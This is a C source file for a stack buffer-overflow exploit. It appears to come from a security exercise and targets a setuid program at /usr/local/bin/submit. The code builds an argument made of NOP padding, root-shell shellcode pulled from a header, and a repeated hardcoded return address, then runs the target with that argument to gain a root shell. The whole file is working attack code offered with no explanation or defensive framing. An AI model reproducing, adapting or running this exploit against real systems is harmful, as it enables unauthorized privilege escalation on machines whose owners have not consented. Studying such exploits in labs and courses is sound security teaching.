#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "shellcode.h"

#define TARGET "/usr/local/bin/submit"
#define NOP 0x90
#define BUF_SIZE 421+100
#define ADDRESS "\x03\xde\xbf\xff"        // Little-endian representation of 0xffbfde03,
                                          // the address of "cmd" passed to print_usage

int main(void)
{
  char *p, *args[4], *env[1];
  unsigned int i;

  args[0] = (char*) malloc(BUF_SIZE);
  p = args[0];

  // Offset with NOP to have the return address aligned
  *(p) = NOP;
  *(p++) = NOP;
  *(p++) = NOP;

  // Gain root shellcode
  for(i = 0; i < strlen(shellcode); i++) {
    *(p++) = shellcode[i];
  }

  // Fill the rest of the stack with the return address
  while(i < BUF_SIZE - strlen(shellcode)) {
    strcpy(p, ADDRESS);
    p += 4;
    i += 4;
  }

  args[1] = "-h";
  args[2] = NULL;
  args[3] = NULL;

  env[0] = NULL;

  if (execve(TARGET, args, env) < 0)
    fprintf(stderr, "execve failed.\n");
  
  exit(0);
}
